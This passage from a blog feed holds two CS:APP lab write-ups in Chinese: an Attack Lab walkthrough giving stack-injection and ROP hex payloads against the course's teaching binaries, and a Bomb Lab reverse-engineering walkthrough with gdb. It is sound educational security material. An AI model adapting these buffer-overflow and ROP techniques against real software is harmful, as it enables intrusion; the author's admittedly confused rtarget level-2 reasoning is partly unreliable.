class="line">retq</span><br></pre></td></tr></table></figure><p>就完成了，再加上填充字节总共40字节再在末尾返回栈地址就可以直接执行刚刚注入的代码了。我们接下来就要确定栈的地址了。<code>gdb ctarget </code>然后在<code>getbuf</code>这里下断点.<code>r -q</code>运行到<code>sub rsp,0x28</code>这一步我们观察栈指针的位置</p><p><img src="https://i.loli.net/2021/04/26/51MLvTDFXRdAIjK.png" alt="attacklab_ctarget_level2_2.png"></p><p>那么我们可以在返回地址的位置指向栈中我们堆的代码的位置，让它执行这些指令，以此达到传参且执行函数的目的。依然要注意小端问题。接下来我们只需要解决一个问题：如何把汇编代码转换为字节码？</p><p>先<code>vim 1.s</code>，填入汇编代码，然后<code>gcc -c 1.s -o 1.o</code>汇编之后，再<code>objdump -d 1.o</code>反汇编就可以查看汇编代码的字节码了。</p><p><img src="https://i.loli.net/2021/04/26/b7dpJR2DMv8N3k5.png" alt="attacklab_ctarget_level2_4.png"></p><p>易得<code>payload</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure><p>可以看到，攻击成功了。</p><p><img src="https://i.loli.net/2021/04/26/mbuiMhVOGQY2Tca.png" alt="attacklab_ctarget_level2_3.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>这里的提权函数是<code>touch3</code>，<code>writeup</code>中已经给了我们函数的语句(Ps:我做到这里才知道writeup是说明的意思qwq)。</p><p><img src="https://i.loli.net/2021/04/26/R37sHQJ1e5FWf2n.png" alt="attacklab_Ctarget_level3_1.png"></p><p>要求<code>hexmatch</code>函数返回<code>true</code>，这次攻击才能成功，题目也给了我们这个函数的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall hexmatch(unsigned int val, char *sval)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v2; // rbx</span><br><span class="line">  char cbuf[110]; // [rsp+0h] [rbp-98h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+78h] [rbp-20h]</span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = &amp;cbuf[random() % 100];</span><br><span class="line">  __sprintf_chk(v2, 1LL, -1LL, &quot;%.8x&quot;, val);</span><br><span class="line">  return strncmp(sval, v2, 9uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数两个输入，一个就是<code>val</code>，那么实参就是<code>cookie</code>的值，已经确定了改不了了，<code>sval</code>参数是<code>touch3()</code>原参数给的，因此我们在<code>call touch3</code>的时候给<code>rdi</code>传的参数就可以是<code>hexmatch</code>的第二个参数。中间有一步是徐晃一枪，那就是这个随机函数了，但是接下来有一个<code>sprintf</code>函数，<code>sprintf</code>函数是将格式化字符串输出给<code>s</code>。那么把<code>val</code>以<code>8</code>位十六进制数给<code>s</code>的意思就是<code>s=&quot;59b997fa&quot;</code>,所以<code>s</code>字符串看似随机实则固定的。字符串传参是传字符串首字符的<code>char</code>指针，数值为首字符到<code>’\0’</code>之间的所有字符（大端序）。那么我们构造的<code>sval</code>字符串的字节码就要应该是：<code>35 39 62 39 39 37 66 61</code>，知道了要构造的字符串之后还要想办法将它作为参数传到<code>rdi</code>里面。我们可以将它保存到栈中的某个位置，因为在调用函数的时候<code>getbuf</code>栈帧的部分可能会因为正常调用<code>hexmatch</code>函数被破坏，所以我们在缓冲区下<code>4</code>个字节填充所需的字符串，就算破坏其它栈帧也没有关系，只要能执行就<code>ok</code>。那么很容易构造<code>payload</code>：在这里要注入的代码跟原来差不多，只是参数要变成<code>cookie</code>字符串的首地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>注意最后一位要<code>00</code> 填充，因为字符串是要到<code>00</code>才结束的，如果不是那么就会一直进行下去。</p><h2 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h2><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>这个官方的<code>writeup</code>已经明确说了，栈只读，因此得采取<code>rop</code>的方式取攻击执行<code>touch2()</code>。</p><p>我们使用<code>objdump -d rtarget</code>去查看代码碎片看看哪里可以利用。首先我们想的应该是，<code>movq $0x59b997fa,%rdi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>但是发现你根本找不到<code>movq $0x59b997fa,%rdi</code>，所以这个方法略掉。</p><p>那还有<code>plan B</code>：在栈上<code>rsp</code>里面装入那个数然后<code>popq</code>弹到<code>rdi</code>里面就好了，那么我们想的就是，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>我们搜索一下<code>popq %rdi </code>的字节码<code>5f</code>，发现<code>0x40233a</code>有一个5f的</p><p>那就很容易构造<code>payload</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3a 23 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/kCrAciSvRxqJgWs.png" alt="attacklab_rtarget_level2_1.png"></p><p>事实上这里我是没有攻击成功的，我觉得从逻辑上来讲是没有任何问题的，有大佬看到蒟蒻的小错误恳请帮忙指正。那么正确的做法是先把它pop到rax寄存器里面，然后执行<code>movq %rax,%rdi</code>然后再<code>ret touch3()</code>？？？到底有啥区别嘛，还是搞不懂。。</p><p>那么代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>构造出来的payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>这个应该不难，但是我还是想知道我的哪里有问题！！！</p><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>首先想想我们要干嘛？构造在一个特殊的地方构造字符串然后把字符串字符首地址传给<code>rdi</code>就能直接攻击成功。开启了栈只读和地址随机化，那么我们还是只能通过栈去溢出，肯定是要先把字符串写在后面，中间全是<code>gadget</code>。然后通过确定<code>rsp</code>的值以及我们已构造的<code>gadget</code>，我们就可以很轻松地获得字符串地址。</p><p>那么我们需要的汇编代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//movq %rsp,%rdi</span><br><span class="line">movq %rsp,%raxa</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">add $offset,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里主要是add这条指令，别问我为什么刚才的思路打断了，都是上面那个<code>level2</code>搞得，就佛系一点把，先把它传给<code>rax</code>再给<code>rdi</code>也一样的，即使我不知道一步到位为什么不行。接下来是寻找<code>gadget</code>了。其它的都能很好找到，唯独<code>add</code>这条指令不好搞，但是我们可以大致看一下规律。</p><p><img src="https://i.loli.net/2021/04/26/Sl1a8dpCuFRA7jO.png" alt="attacklab_rtarget_level3_1.png"></p><p>我们可以很清晰地发现，<code>add $xxx,%rdi</code>的一般规律就是 <code>48 83 c7</code> 然后后面一个字节确定立即数的大小那么就去搜索一下<code>48 83 c7</code>，但是很快就会发现，搜不到这个<code>gadget</code>。那么换一种思路，既然我们先传给了<code>rax</code>那我们可以先让<code>rax</code>加上那个值啊。说干就干，汇编再反之后得到字节码<code>48 05 00</code>发现还是找不到，一筹莫展之际，你突然想到，可以利用寄存器的低位，他们的操作码也有很大区别的，比如<code>rax</code>的低32位是<code>eax</code>，低16位是<code>ax</code>，低8位是<code>al</code>，我们一个个找过去发现add al有一个。04 37 这刚好是al+0x37的gadget。</p><p><img src="https://i.loli.net/2021/04/26/PiXlM34VsBgL1qT.png" alt="attacklab_rtarget_level3_2.png"></p><p>这个大小也是非常合适的，在尽量保证能够全覆盖的情况下保证<code>payload</code>越小越好，大了容易出事。</p><p>那么如此我们就只到我们重新堆的代码结构了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">add $0x37,al</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00// movq %rsp,%rax</span><br><span class="line">d8 19 40 00 00 00 00 00// add $0x37,al</span><br><span class="line">c5 19 40 00 00 00 00 00// movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00//touch3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 35//cookie</span><br><span class="line">39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>然后完结撒花啦！！</p><p>第一次能自己写完csapp的lab，虽然难，但是收获颇丰，若有不正，恳请指正！！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来康康attack lab啊&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="lab" scheme="http://example.com/categories/csapp/lab/"/>
    
    
  </entry>
  
  <entry>
    <title>bomblab实验报告:二进制安全与逆向分析</title>
    <link href="http://example.com/2021/04/19/bomblab/"/>
    <id>http://example.com/2021/04/19/bomblab/</id>
    <published>2021-04-19T14:00:00.000Z</published>
    <updated>2021-10-25T05:20:07.767Z</updated>
    
    <content type="html"><![CDATA[<p>先观察给的.c文件，发现是要输入六组语句并且判断正误的，并且很容易发现判断函数phase_i(i=1,2…6)要有一个错误，炸弹即爆炸，那我们就要用到gdb调试了,在终端输入<code>gdb bomb</code>进入调试</p><span id="more"></span><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>首先在phase_1处断点（命令：<code>b phase_1</code>）找到phase_1的拆弹语句。然后<code>r</code>运行，先随便输入点东西这里我输入了很多a,断在该处之后单步调试，因为要进入函数内部，我们用命令<code>step</code>或者<code>s</code>进行单步调试。调试发现一个<code>strings_not_equal</code>函数，跟进去看发现寄存器<code>rdi</code>为我们输入的很多个a，而寄存器<code>rsi</code>已经有了一句话。</p><p><img src="https://i.loli.net/2021/04/25/dVN392JXrMQjDwu.png" alt="bomblab_phase_1_1.png"></p><p>那么能直接断定这个就是我们的拆弹语句，重新调试进去输入那个语句<code>Border relations with Canada have never been better.</code>发现成功拆掉了这个炸弹，那么phase_1就拆掉了。</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>拆完了之后就看向phase_2，我们先<code>delete</code>    清除所有断点然后<code>b phase_2</code>新增断点，<code>r</code>之后先输入之前的拆弹语句来到phase_2，我们照例输入很多的a，<code>s</code>单步调试进去发现有一个函数叫<code>read_six_numbers</code>，跟进去发现</p><p><img src="https://i.loli.net/2021/04/25/J7O8Yjl9kKnC1SN.png" alt="bomblab_phase_2_1.png"></p><p>调用了<code>scanf</code>函数并且能看到参数<code>%d %d %d %d %d %d</code>，那无疑我们这次应该输入六个整数。那就先猜，就先输入6个0也罢，但此时我们不能’s’单步调试了，因为<code>scanf</code>内部构造很复杂，<code>s</code>单步调试会把你键盘按烂的。因此我们用<code>next</code>或<code>n</code>单步调试，跳过了<code>scanf</code>函数的内部，成功给了6个整数，然后继续调试，发现</p><p><img src="https://i.loli.net/2021/04/25/Kil6fnbgrRJH4hm.png" alt="bomblab_phase_2_2.png"></p><p><code>ptr[rsp]=1</code>才能跳转避免执行到<code>explode</code>函数，我们稍微调试一下也可以发现<code>ptr[rsp]</code>存了第一个输入的数值，那么就可以很容易得到第一个整数是<code>1</code>，我们把第一个值改成1，其它的照常不变，发现第一个数躲过了爆炸，那么说明我们的方案可行，接下来只需要把剩下五个数判断完了就可以了。继续<code>n</code>单步调试，发现第二个测试的数是</p><p><img src="https://i.loli.net/2021/04/25/HRzX9CYaBQLN1Sc.png" alt="bomblab_phase_2_3.png"></p><p>一样的是比较<code>eax</code>上面我们可以看到有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add eax,eax</span><br></pre></td></tr></table></figure><p>然后再比较，那么第二个数不就应该是2了吗？，虽然我也不知道为什么<code>ptr[rbx]</code>它就是第二个数，但是稍微想想也知道肯定是依次对你的输入去判断的，所以第二个数是2了。同理，他每次都加上自己，那么每次输入的数就是前面数的两倍，那清晰了，答案应该就是<code>1 2 4 8 16 32</code>。清除断点输入后发现没有爆炸，那么phase_2也拆弹成功了。</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>然后断点下在phase_3，接着运行到那边。运行到scanf发现格式化字符串为”%d %d”，那就是两个整数，并且看到后面有一个<code>cmp eax,1</code>，并且要求<code>eax&gt;1</code>，否则就执行爆炸函数了，<code>eax</code>在<code>scanf</code>之后获得了<code>scanf</code>函数的返回值，scanf的返回值就是输入数的个数。那我们就随便输入俩数看看。</p><p><img src="https://i.loli.net/2021/04/25/JPg3Rp4u7Tjr6If.png" alt="bomblab_phase_3_1.png"></p><p>继续调试发现，如果<code>ptr[rsp+8]</code>大于<code>7</code>会发生跳转不妨先输入大于<code>7</code>的值看看会跳转到哪儿，输入之后，好的，成功爆炸，躲不掉的那种哦。</p><p><img src="https://i.loli.net/2021/04/25/etqlSa591MrFCVp.png" alt="bomblab_phase_3_2.png"></p><p>那看来我们第一个数只能输入<code>0~7</code>之内的值，我们先输入<code>0 0</code>来看看，继续单步调试发现</p><p><img src="https://i.loli.net/2021/04/25/mz7utwg8CNbLYPU.png" alt="bomblab_phase_3_3.png"></p><p>那说明我们应该输入<code>0 207</code>，因为<code>eax</code>被赋值了<code>0xcf</code>，然后又比较中也含有<code>eax</code>重新来一遍发现竟然过了，直接能进入到phase_4的那种，那么你就会思考，<code>1~7</code>会发生什么，据测试，每个数对应了一个整数，你可以理解为有一个函数<code>f(x)x∈[0,7]∩Z</code>然后你必须正确输入<code>x f(x)</code>的其中一个对应。那你可能还会想，负数有没有对应，其实我也试过，负数直接就不行了，因为<code>jg</code>指令是判断无符号数的，负数就会被看成一个很大的正整数，那么你还是不可避免的爆炸了。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>在<code>phase_4</code>处断点，依次输入前三条拆弹语句，第四句老规矩输入很多<code>a</code>，<code>s</code>单步调试进入<code>scanf</code>，发现语句依然是<code>%d %d</code>，好嘛，又是两个整型，那重来，先<code>0 0</code>，<code>n</code>单步调试进去发现有一个语句<code>cmp eax,2 jne</code>，<code>jne</code>为<code>jump not equal</code>这个判断也很简单，就是看<code>scanf</code>有没有输入2个数，它都是<code>%d %d</code>了，肯定你只能输入两个数啊，不是两个就爆炸了(<del>Ps:别问我为什么这么肯定的</del>)。</p><p><img src="https://i.loli.net/2021/04/25/fTMdxrpsWg1ocXE.png" alt="bomblab_phase_4_1.png"></p><p>输入两个<code>0</code>发现莫名其妙过了，其实我想就这么水过去的，但是还得去分析的。</p><p><code>disassemble func4</code>查看一下它那个函数的汇编代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x08048d0b &lt;+0&gt;:sub    $0x1c,%esp</span><br><span class="line">   0x08048d0e &lt;+3&gt;:mov    %ebx,0x14(%esp)</span><br><span class="line">   0x08048d12 &lt;+7&gt;:mov    %esi,0x18(%esp)</span><br><span class="line">   0x08048d16 &lt;+11&gt;:mov    0x20(%esp),%eax</span><br><span class="line">   0x08048d1a &lt;+15&gt;:mov    0x24(%esp),%edx</span><br><span class="line">   0x08048d1e &lt;+19&gt;:mov    0x28(%esp),%esi </span><br><span class="line">   0x08048d22 &lt;+23&gt;:mov    %esi,%ecx</span><br><span class="line">   0x08048d24 &lt;+25&gt;:sub    %edx,%ecx       </span><br><span class="line">   0x08048d26 &lt;+27&gt;:mov    %ecx,%ebx</span><br><span class="line">   0x08048d28 &lt;+29&gt;:shr    $0x1f,%ebx    </span><br><span class="line">   0x08048d2b &lt;+32&gt;:add    %ebx,%ecx     </span><br><span class="line">   0x08048d2d &lt;+34&gt;:sar    %ecx          </span><br><span class="line">   0x08048d2f &lt;+36&gt;:lea    (%ecx,%edx,1),%ebx    </span><br><span class="line">   0x08048d32 &lt;+39&gt;:cmp    %eax,%ebx</span><br><span class="line">   0x08048d34 &lt;+41&gt;:jle    0x8048d4d &lt;func4+66&gt;</span><br><span class="line">   0x08048d36 &lt;+43&gt;:lea    -0x1(%ebx),%ecx</span><br><span class="line">   0x08048d39 &lt;+46&gt;:mov    %ecx,0x8(%esp)</span><br><span class="line">   0x08048d3d &lt;+50&gt;:mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d41 &lt;+54&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048d44 &lt;+57&gt;:call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d49 &lt;+62&gt;:add    %eax,%ebx   </span><br><span class="line">   0x08048d4b &lt;+64&gt;:jmp    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d4d &lt;+66&gt;:cmp    %eax,%ebx  </span><br><span class="line">   0x08048d4f &lt;+68&gt;:jge    0x8048d66 &lt;func4+91&gt;</span><br><span class="line">   0x08048d51 &lt;+70&gt;:mov    %esi,0x8(%esp)</span><br><span class="line">   0x08048d55 &lt;+74&gt;:lea    0x1(%ebx),%edx </span><br><span class="line">   0x08048d58 &lt;+77&gt;:mov    %edx,0x4(%esp)</span><br><span class="line">   0x08048d5c &lt;+81&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x08048d5f &lt;+84&gt;:call   0x8048d0b &lt;func4&gt;</span><br><span class="line">   0x08048d64 &lt;+89&gt;:add    %eax,%ebx  </span><br><span class="line">   0x08048d66 &lt;+91&gt;:mov    %ebx,%eax   </span><br><span class="line">   0x08048d68 &lt;+93&gt;:mov    0x14(%esp),%ebx</span><br><span class="line">   0x08048d6c &lt;+97&gt;:mov    0x18(%esp),%esi</span><br><span class="line">   0x08048d70 &lt;+101&gt;:add    $0x1c,%esp</span><br><span class="line">   0x08048d73 &lt;+104&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>这个函数先放在这我们先看后面有哪些条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test   eax, eax</span><br><span class="line">jne    phase_4+76 &lt;phase_4+76&gt; </span><br><span class="line">cmp    dword ptr [rsp + 0xc], 0</span><br><span class="line">je     phase_4+81 &lt;phase_4+81&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一次是跳转会爆炸，第二次是不跳转会爆，那么换言之，两次都必须等于，那么第一次的<code>test eax,eax</code>它干什么了呢？先想一想它怎么判断两个数相等，两个数相等当且仅当它们之差为0时成立，字符串也同理。那么换言之，它就判断<code>eax</code>的值是不是<code>0</code>而已相等为<code>0</code>，不相等则不为<code>0</code>。那么很清楚了，防止它跳转，我们要保证<code>eax</code>寄存器值为0。下面就是判断第二个输入的值是否为0了，为0跳转。</p><p><img src="https://i.loli.net/2021/04/25/usg2zr6lbFYjwhE.png" alt="bomblab_phase_4_2.png"></p><p>实际上，这里的<code>ptr[rsp+0xc]</code>就是我们输入第二个数的低八位。因此第二个数只能输入<code>0</code>因为第一次比较用到了寄存器比较，我们也不知道运行这个函数之后函数的返回值是多少(<code>rax</code>保存函数返回值)，只能去调试看看。因此这个答案是<code>0 0</code></p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>依然先断点，输入之前四句拆弹语句。到这里之后随便输入点东西，发现了</p><p><img src="https://i.loli.net/2021/04/25/sQSBH3YFexy6dNJ.png" alt="bomblab_phase_5_1.png"></p><p>这回是要输入一串字符串，而且还有长度检测，不等于6直接爆炸qwq。</p><p>那我们先随便输入一个<code>aaaaaa</code>看看情况</p><p><img src="https://i.loli.net/2021/04/25/JaWfPYRIysXc9qU.png" alt="bomblab_phase_5_2.png"></p><p>很明显，有一个循环，以<code>eax</code>为循环变量，依次对输入的字符进行一系列的操作。具体操作是：先对字符<code>and 0xf</code>然后把结果保存在<code>rdx</code>里面，返回的字符是<code>0x4024b0+rdx</code>,最后这个保存到<code>rsp+rax+0x10</code>里面，在往栈底偏移<code>0x10</code>的地方起一个保存好的字符串。接下来又要怎么操作呢？接着单步调试看看：</p><p><img src="https://i.loli.net/2021/04/25/SiLjU51Z3BroAk9.png" alt="bomblab_phase_5_3.png"></p><p>发现在<code>rsp+0x10</code>那个位置的字符串要被<code>&quot;flyers&quot;</code>字符串比较，相等跳转，不跳转就炸了，那么唯一没有看的就是刚刚那个<code>0x4024b0+rdx</code>到底是什么了。但是可以猜测这应该是一个字符串，然后<code>rdx</code>做偏移取字符串的下标对应的字符。<code>print (char *)0x4024b0</code>查看这个字符串发现输出了一个很长的东西<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>因为可以看到它的偏移被<code>and 0xf</code>可以很容易证明这个偏移肯定小于等于<code>0xf</code>，那么我们取出16位的字符串<code>maduiersnfotvbyl</code>,<code>flyers</code>的话，它的偏移可以是：<code>9 15 14 5 6 7</code>这里建议大家写脚本跑一下，自己硬算也可以的。为了防止字符无效，我们尽量取满可能，因为偏移是固定的，但是高四位不管是什么都是可以的，反正最后要被<code>and 0xf</code></p><p><img src="https://i.loli.net/2021/04/25/EWxXJ2PuAQ3HoIc.png" alt="bomblab_phase_5_4.png"></p><p>因为每个字符都是相互独立的，所以你可以在这六行任意取一个可读字符最后拼接成字符串。因为有些字符不可编辑，所以采取这种措施是最妙的。</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>待更新</p><p>因为作者目前比较菜，phase_6和secret_bomb都不会做，如果上面有哪里说的不对的恳请指正。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;先观察给的.c文件，发现是要输入六组语句并且判断正误的，并且很容易发现判断函数phase_i(i=1,2…6)要有一个错误，炸弹即爆炸，那我们就要用到gdb调试了,在终端输入&lt;code&gt;gdb bomb&lt;/code&gt;进入调试&lt;/p&gt;</summary>
    
    
    
    <category term="csapp" scheme="http://example.com/categories/csapp/"/>
    
    <category term="lab" scheme="http://example.com/categories/csapp/lab/"/>
    
    
  </entry>
  
</feed>
